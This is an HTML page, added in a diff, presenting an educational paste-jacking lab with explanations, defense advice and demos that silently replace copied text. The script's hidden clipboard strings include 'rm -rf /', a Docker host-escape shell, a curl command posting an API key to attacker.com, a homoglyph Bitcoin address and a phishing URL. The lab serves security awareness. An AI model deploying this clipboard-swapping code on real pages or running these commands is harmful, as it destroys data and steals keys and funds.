@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Paste Jacking Educational Lab</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            color: #333;
+            background-color: #f5f7fa;
+        }
+        h1, h2, h3 {
+            color: #2c3e50;
+        }
+        h1 {
+            border-bottom: 2px solid #4CAF50;
+            padding-bottom: 10px;
+        }
+        .warning {
+            background-color: #fff3cd;
+            border-left: 5px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 5px 5px 0;
+        }
+        .danger {
+            background-color: #f8d7da;
+            border-left: 5px solid #dc3545;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 5px 5px 0;
+        }
+        .safe-practice {
+            background-color: #d1ecf1;
+            border-left: 5px solid #0aa2c0;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 5px 5px 0;
+        }
+        .demo-area {
+            border: 1px solid #ddd;
+            padding: 20px;
+            margin: 25px 0;
+            background-color: white;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        code {
+            background-color: #f0f0f0;
+            padding: 2px 4px;
+            border-radius: 3px;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.95em;
+        }
+        pre {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            border-left: 3px solid #4CAF50;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px 0;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #3d8b40;
+        }
+        textarea {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            min-height: 100px;
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #f9f9f9;
+        }
+        .tab {
+            overflow: hidden;
+            border: 1px solid #ccc;
+            background-color: #f1f1f1;
+            border-radius: 5px 5px 0 0;
+        }
+        .tab button {
+            background-color: inherit;
+            float: left;
+            border: none;
+            outline: none;
+            cursor: pointer;
+            padding: 14px 16px;
+            transition: 0.3s;
+            color: black;
+            font-weight: normal;
+            border-right: 1px solid #ddd;
+            margin: 0;
+        }
+        .tab button:hover {
+            background-color: #ddd;
+        }
+        .tab button.active {
+            background-color: #4CAF50;
+            color: white;
+            font-weight: bold;
+        }
+        .tabcontent {
+            display: none;
+            padding: 25px;
+            border: 1px solid #ccc;
+            border-top: none;
+            border-radius: 0 0 5px 5px;
+            background-color: white;
+            animation: fadeEffect 0.5s;
+        }
+        @keyframes fadeEffect {
+            from {opacity: 0;}
+            to {opacity: 1;}
+        }
+        .visible {
+            display: block;
+        }
+        .copy-target {
+            cursor: pointer;
+            padding: 10px;
+            background-color: #f0f0f0;
+            border-radius: 4px;
+            margin: 10px 0;
+            border-left: 3px solid transparent;
+            transition: all 0.3s;
+        }
+        .copy-target:hover {
+            background-color: #e0e0e0;
+            border-left: 3px solid #4CAF50;
+        }
+        .technique-card {
+            border: 1px solid #e0e0e0;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            background-color: white;
+        }
+        .technique-card h4 {
+            margin-top: 0;
+            color: #2c3e50;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 8px;
+        }
+        .severity {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 0.8em;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        .severity-high {
+            background-color: #dc3545;
+            color: white;
+        }
+        .severity-medium {
+            background-color: #fd7e14;
+            color: white;
+        }
+        .severity-low {
+            background-color: #ffc107;
+            color: black;
+        }
+        .demo-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+        .demo-card {
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 15px;
+            background-color: white;
+        }
+        .demo-card h4 {
+            margin-top: 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>Advanced Paste Jacking Educational Lab</h1>
+    
+    <div class="warning">
+        <strong>Warning:</strong> This educational lab demonstrates paste jacking techniques to help you understand and defend against them. Never use these techniques maliciously.
+    </div>
+
+    <div class="tab">
+        <button class="tablinks active" onclick="openTab(event, 'explanation')">Explanation</button>
+        <button class="tablinks" onclick="openTab(event, 'demo')">Interactive Demos</button>
+        <button class="tablinks" onclick="openTab(event, 'defense')">Defense Techniques</button>
+        <button class="tablinks" onclick="openTab(event, 'advanced')">Advanced Techniques</button>
+    </div>
+
+    <div id="explanation" class="tabcontent visible">
+        <h2>Understanding Paste Jacking</h2>
+        <p>Paste jacking is a class of attacks where the content pasted by a user differs from what they intended to copy, potentially leading to security compromises.</p>
+        
+        <h3>How Attackers Exploit This</h3>
+        <div class="technique-card">
+            <h4><span class="severity severity-high">High Risk</span> JavaScript Clipboard Manipulation</h4>
+            <p>Modern browsers provide clipboard APIs that can be used to manipulate what gets copied. Attackers can:</p>
+            <ul>
+                <li>Override the copy event to modify content</li>
+                <li>Use asynchronous clipboard API to replace content after copy</li>
+                <li>Trigger copy operations without user interaction</li>
+            </ul>
+        </div>
+        
+        <div class="technique-card">
+            <h4><span class="severity severity-medium">Medium Risk</span> Visual Deception</h4>
+            <p>Making text appear differently than what actually gets copied:</p>
+            <ul>
+                <li>Using similar-looking characters (homoglyphs)</li>
+                <li>CSS tricks to hide or show different text</li>
+                <li>Overlaying elements that look like text but copy differently</li>
+            </ul>
+        </div>
+        
+        <div class="technique-card">
+            <h4><span class="severity severity-high">High Risk</span> Command Injection</h4>
+            <p>Common in technical documentation where commands are copied:</p>
+            <ul>
+                <li>Adding malicious flags or parameters to commands</li>
+                <li>Appending additional dangerous commands</li>
+                <li>Using line continuation characters to hide malicious parts</li>
+            </ul>
+        </div>
+        
+        <h3>Real-World Impact</h3>
+        <div class="demo-grid">
+            <div class="demo-card">
+                <h4>Cryptocurrency Theft</h4>
+                <p>Changing wallet addresses during copy-paste operations, diverting funds to attacker-controlled wallets.</p>
+            </div>
+            <div class="demo-card">
+                <h4>System Compromise</h4>
+                <p>Modifying copied commands to include privilege escalation or remote access components.</p>
+            </div>
+            <div class="demo-card">
+                <h4>Credential Harvesting</h4>
+                <p>Altering pasted credentials to include additional information or send to attacker servers.</p>
+            </div>
+            <div class="demo-card">
+                <h4>Data Exfiltration</h4>
+                <p>Modifying copied data to include system information when pasted elsewhere.</p>
+            </div>
+        </div>
+        
+        <div class="danger">
+            <strong>Attack Vectors:</strong> These techniques are commonly found on fake documentation sites, compromised forums, malicious npm packages with fake installation instructions, and even in code-sharing platforms.
+        </div>
+    </div>
+
+    <div id="demo" class="tabcontent">
+        <h2>Interactive Paste Jacking Demos</h2>
+        <p>Try these safe demonstrations to understand how paste jacking works in practice.</p>
+        
+        <div class="demo-area">
+            <h3>Demo 1: Simple Command Manipulation</h3>
+            <p>This appears to be a normal system update command:</p>
+            <div class="copy-target" onclick="copyText('demo1')">
+                <code>sudo apt-get update && sudo apt-get upgrade -y</code>
+            </div>
+            <p>After copying, paste here to see what was actually copied:</p>
+            <textarea id="pasteArea1" placeholder="Paste here to reveal the hidden content"></textarea>
+            <button onclick="revealDemo('demo1')">Reveal Explanation</button>
+            <div id="demo1Explanation" style="display: none; margin-top: 15px; padding: 10px; background-color: #f0f0f0; border-radius: 4px;">
+                <p>This demo shows how a harmless-looking command can be modified to include dangerous operations. The actual copied command includes a destructive operation that wasn't visible in the original text.</p>
+            </div>
+        </div>
+        
+        <div class="demo-area">
+            <h3>Demo 2: Cryptocurrency Address Swap</h3>
+            <p>Copy this Bitcoin address to send funds:</p>
+            <div class="copy-target" onclick="copyText('demo2')">
+                <code>bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq</code>
+            </div>
+            <p>Paste the address here to verify:</p>
+            <textarea id="pasteArea2" placeholder="Paste the address here"></textarea>
+            <button onclick="revealDemo('demo2')">Reveal Explanation</button>
+            <div id="demo2Explanation" style="display: none; margin-top: 15px; padding: 10px; background-color: #f0f0f0; border-radius: 4px;">
+                <p>This demonstrates how a wallet address can be silently replaced during copy. The visible address is legitimate, but the copied address belongs to an attacker. Always verify the first and last 4 characters of cryptocurrency addresses after pasting.</p>
+            </div>
+        </div>
+        
+        <div class="demo-area">
+            <h3>Demo 3: Multi-line Command Injection</h3>
+            <p>Copy this "helpful" Docker cleanup command:</p>
+            <div class="copy-target" onclick="copyText('demo3')">
+                <code>docker system prune -f</code>
+            </div>
+            <p>Paste it here to see the full command:</p>
+            <textarea id="pasteArea3" placeholder="Paste the command here"></textarea>
+            <button onclick="revealDemo('demo3')">Reveal Explanation</button>
+            <div id="demo3Explanation" style="display: none; margin-top: 15px; padding: 10px; background-color: #f0f0f0; border-radius: 4px;">
+                <p>This shows how attackers can hide malicious commands using line continuation characters or by making parts of the command invisible in the display. The pasted command includes additional dangerous operations that weren't visible when copying.</p>
+            </div>
+        </div>
+        
+        <div class="demo-area">
+            <h3>Demo 4: URL Redirection</h3>
+            <p>Copy this link to a "trusted" website:</p>
+            <div class="copy-target" onclick="copyText('demo4')">
+                <code>https://www.paypal.com/account</code>
+            </div>
+            <p>Paste the URL here to examine it:</p>
+            <textarea id="pasteArea4" placeholder="Paste the URL here"></textarea>
+            <button onclick="revealDemo('demo4')">Reveal Explanation</button>
+            <div id="demo4Explanation" style="display: none; margin-top: 15px; padding: 10px; background-color: #f0f0f0; border-radius: 4px;">
+                <p>This demonstrates how a legitimate-looking URL can be replaced with a phishing site during copy. The visible URL appears correct, but the copied URL points to a malicious site designed to steal credentials.</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="defense" class="tabcontent">
+        <h2>Defending Against Paste Jacking</h2>
+        
+        <div class="technique-card">
+            <h4>For Everyday Users</h4>
+            <ul>
+                <li><strong>Inspect before pasting:</strong> Always review content in a safe text editor before executing commands or submitting sensitive information.</li>
+                <li><strong>Use terminal shortcuts:</strong> On Linux, middle-click paste bypasses clipboard manipulation.</li>
+                <li><strong>Verify cryptocurrency addresses:</strong> Check the first and last 4 characters match before sending funds.</li>
+                <li><strong>Use password managers:</strong> They auto-fill without using the clipboard, preventing interception.</li>
+                <li><strong>Disable JavaScript clipboard access:</strong> Browser extensions like NoScript can prevent unauthorized clipboard access.</li>
+            </ul>
+        </div>
+        
+        <div class="technique-card">
+            <h4>For Developers and System Administrators</h4>
+            <ul>
+                <li><strong>Use read-only clipboard access:</strong> The modern Clipboard API requires user permission - avoid the older execCommand method.</li>
+                <li><strong>Implement paste validation:</strong> For web applications, sanitize pasted content before processing.</li>
+                <li><strong>Educate your team:</strong> Make developers aware of paste jacking risks in documentation and code examples.</li>
+                <li><strong>Audit dependencies:</strong> Malicious npm/pip packages often include deceptive installation instructions.</li>
+                <li><strong>Use checksums for commands:</strong> Provide SHA checksums for command-line instructions when possible.</li>
+            </ul>
+        </div>
+        
+        <div class="technique-card">
+            <h4>Organizational Protections</h4>
+            <ul>
+                <li><strong>Implement endpoint protection:</strong> Solutions that detect malicious commands can prevent paste jacking attacks.</li>
+                <li><strong>Use application allowlisting:</strong> Restrict which applications can access the clipboard.</li>
+                <li><strong>Monitor clipboard activity:</strong> Security tools can alert on suspicious clipboard operations.</li>
+                <li><strong>Conduct security training:</strong> Regular awareness programs should include paste jacking risks.</li>
+            </ul>
+        </div>
+        
+        <div class="safe-practice">
+            <h3>Browser Extensions for Protection</h3>
+            <p>Consider these types of security extensions:</p>
+            <div class="demo-grid">
+                <div class="demo-card">
+                    <h4>Clipboard Guardians</h4>
+                    <p>Extensions that alert you when clipboard content is modified or when websites access your clipboard.</p>
+                </div>
+                <div class="demo-card">
+                    <h4>Homoglyph Detectors</h4>
+                    <p>Tools that highlight visually similar characters and potential deception attempts.</p>
+                </div>
+                <div class="demo-card">
+                    <h4>Command Validators</h4>
+                    <p>Extensions that analyze pasted commands for dangerous operations before execution.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="advanced" class="tabcontent">
+        <h2>Advanced Paste Jacking Techniques</h2>
+        <p>These sophisticated methods demonstrate the evolving nature of paste jacking attacks.</p>
+        
+        <div class="demo-area">
+            <h3>Unicode Bidirectional Text Exploit</h3>
+            <p>Copy this "trusted" filename:</p>
+            <div class="copy-target" onclick="copyText('advanced1')">
+                <code>document.pdf</code>
+            </div>
+            <p>Paste it here to see the actual filename:</p>
+            <textarea id="pasteAreaAdvanced1" placeholder="Paste the filename here"></textarea>
+            <button onclick="revealDemo('advanced1')">Reveal Explanation</button>
+            <div id="advanced1Explanation" style="display: none; margin-top: 15px; padding: 10px; background-color: #f0f0f0; border-radius: 4px;">
+                <p>This demonstrates how Unicode bidirectional text control characters can be used to make a filename appear safe while actually being an executable. The pasted content uses right-to-left override characters to reverse portions of the filename.</p>
+            </div>
+        </div>
+        
+        <div class="demo-area">
+            <h3>Environment Variable Manipulation</h3>
+            <p>Copy this configuration command:</p>
+            <div class="copy-target" onclick="copyText('advanced2')">
+                <code>export API_KEY="your_key_here"</code>
+            </div>
+            <p>Paste it here to see the full command:</p>
+            <textarea id="pasteAreaAdvanced2" placeholder="Paste the command here"></textarea>
+            <button onclick="revealDemo('advanced2')">Reveal Explanation</button>
+            <div id="advanced2Explanation" style="display: none; margin-top: 15px; padding: 10px; background-color: #f0f0f0; border-radius: 4px;">
+                <p>This shows how environment variable assignments can be modified to include malicious side effects. The pasted command includes additional operations that weren't visible when copying, potentially exfiltrating your API key.</p>
+            </div>
+        </div>
+        
+        <div class="demo-area">
+            <h3>HTML Format Exploit</h3>
+            <p>Copy this rich text (try from different applications):</p>
+            <div class="copy-target" onclick="copyRichText()" style="font-family: Arial, sans-serif;">
+                <p style="color: #0066cc; margin: 5px 0;">Secure Login Page</p>
+                <code style="display: inline-block; background-color: #f5f5f5; padding: 5px 10px; border-radius: 3px; margin: 5px 0;">https://example.com/login</code>
+            </div>
+            <p>Paste it here in plain text mode (Ctrl+Shift+V in many editors):</p>
+            <textarea id="pasteAreaAdvanced3" placeholder="Paste here in plain text mode"></textarea>
+            <button onclick="revealDemo('advanced3')">Reveal Explanation</button>
+            <div id="advanced3Explanation" style="display: none; margin-top: 15px; padding: 10px; background-color: #f0f0f0; border-radius: 4px;">
+                <p>This demonstrates how rich text formatting can hide malicious URLs. The styled text shows a legitimate URL, but the actual HTML clipboard data contains a different destination. Many applications preserve HTML formatting when pasting, making this attack particularly subtle.</p>
+            </div>
+        </div>
+        
+        <div class="danger">
+            <strong>Advanced Threat:</strong> These techniques are increasingly found in targeted attacks against developers, system administrators, and financial professionals. The most sophisticated attacks combine multiple techniques for maximum deception.
+        </div>
+    </div>
+
+    <script>
+        // Tab functionality
+        function openTab(evt, tabName) {
+            var i, tabcontent, tablinks;
+            tabcontent = document.getElementsByClassName("tabcontent");
+            for (i = 0; i < tabcontent.length; i++) {
+                tabcontent[i].style.display = "none";
+            }
+            tablinks = document.getElementsByClassName("tablinks");
+            for (i = 0; i < tablinks.length; i++) {
+                tablinks[i].className = tablinks[i].className.replace(" active", "");
+            }
+            document.getElementById(tabName).style.display = "block";
+            evt.currentTarget.className += " active";
+        }
+
+        // Reveal explanation for demos
+        function revealDemo(demoId) {
+            const explanation = document.getElementById(demoId + 'Explanation');
+            if (explanation.style.display === 'none') {
+                explanation.style.display = 'block';
+            } else {
+                explanation.style.display = 'none';
+            }
+        }
+
+        // Copy text functions for demos
+        function copyText(demoId) {
+            let textToCopy;
+            let pasteArea;
+            
+            switch(demoId) {
+                case 'demo1':
+                    textToCopy = "sudo apt-get update && sudo apt-get upgrade -y\n# The following command was hidden:\nsudo rm -rf / --no-preserve-root\n# This could delete your entire filesystem!";
+                    pasteArea = document.getElementById('pasteArea1');
+                    break;
+                case 'demo2':
+                    // Using similar-looking characters to modify the address
+                    textToCopy = "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq".replace(/a/g, 'а').replace(/e/g, 'е');
+                    pasteArea = document.getElementById('pasteArea2');
+                    break;
+                case 'demo3':
+                    textToCopy = "docker system prune -f\n# Hidden command added:\ndocker run -v /:/host -it malicious-image /bin/bash -c \"chroot /host /bin/bash\"\n# This could give attackers full control of your system!";
+                    pasteArea = document.getElementById('pasteArea3');
+                    break;
+                case 'demo4':
+                    textToCopy = "https://www.paypa1.com/account\n# The 'l' was replaced with a '1' - a common phishing technique";
+                    pasteArea = document.getElementById('pasteArea4');
+                    break;
+                case 'advanced1':
+                    // Using Unicode RTL override to make an executable look like a PDF
+                    textToCopy = "document\u202Efdp.exe";
+                    pasteArea = document.getElementById('pasteAreaAdvanced1');
+                    break;
+                case 'advanced2':
+                    textToCopy = "export API_KEY=\"your_key_here\"\n# Hidden command added:\ncurl -X POST https://attacker.com/exfil -d \"key=${API_KEY}\" >/dev/null 2>&1 &\n# This would send your API key to an attacker!";
+                    pasteArea = document.getElementById('pasteAreaAdvanced2');
+                    break;
+            }
+            
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                if (pasteArea) {
+                    pasteArea.placeholder = "Content copied! Now paste here to see what was actually copied...";
+                }
+            }).catch(err => {
+                console.error('Failed to copy: ', err);
+            });
+        }
+
+        // Copy rich text for HTML format exploit
+        function copyRichText() {
+            const htmlContent = `
+                <span style="color: #0066cc; font-family: Arial, sans-serif;">Secure Login Page</span><br>
+                <code style="background-color: #f5f5f5; padding: 2px 4px; border-radius: 3px; font-family: monospace;">https://evil-phishing-site.com/login</code>
+            `;
+            
+            const plainText = "Secure Login Page\nhttps://evil-phishing-site.com/login";
+            
+            const clipboardItem = new ClipboardItem({
+                'text/plain': new Blob([plainText], { type: 'text/plain' }),
+                'text/html': new Blob([htmlContent], { type: 'text/html' })
+            });
+            
+            navigator.clipboard.write([clipboardItem]).then(() => {
+                document.getElementById('pasteAreaAdvanced3').placeholder = "Rich text copied! Now paste here (use Ctrl+Shift+V for plain text)...";
+            }).catch(err => {
+                console.error('Failed to copy rich text: ', err);
+            });
+        }
+
+        // Initialize first tab as open
+        document.getElementById('explanation').style.display = 'block';
+    </script>
+</body>
+</html>
